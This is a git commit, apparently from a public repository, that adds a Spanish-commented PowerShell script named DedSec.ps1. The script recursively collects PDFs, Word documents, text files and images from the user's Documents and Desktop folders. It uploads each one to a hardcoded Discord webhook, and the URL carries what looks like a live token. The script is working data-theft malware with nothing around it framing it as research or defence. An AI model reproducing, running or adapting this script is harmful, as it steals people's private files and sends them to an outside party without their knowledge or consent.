d6ee46bb767fde93090200c363ddb9623d8b7acd
KovaxKrk <149738764+KovaxKrk@users.noreply.github.com>
2025-02-19 17:39:58 -0300

    Add files via upload

---
+++ DedSec.ps1
@@ -0,0 +1,23 @@
+$wc = New-Object System.Net.WebClient
+
+$files = Get-ChildItem -Path "$env:USERPROFILE\Documents", "$env:USERPROFILE\Desktop" -Include *.pdf, *.doc, *.docx, *.txt, *.jpg, *.png -File -Recurse -ErrorAction SilentlyContinue
+
+if ($files.Count -eq 0) {
+    Write-Host "No se encontraron archivos para subir."
+    exit
+}
+
+$webhookUrl = "https://discord.com/api/webhooks/1256038727684194325/D7rqZlz9775lUFMYL6DAWyuRYYZwPXCnlxH2j8cG_UoLmkDlx1bub4F4_o5S4cpPU8Na"
+
+foreach ($file in $files) {
+    try {
+        # Subir el archivo
+        $wc.UploadFile($webhookUrl, $file.FullName)
+        Write-Host "Archivo subido: $($file.FullName)"
+    } catch {
+        Write-Host "Error al subir el archivo: $($file.FullName)"
+        Write-Host "Error: $_"
+    }
+}
+
+$wc.Dispose()
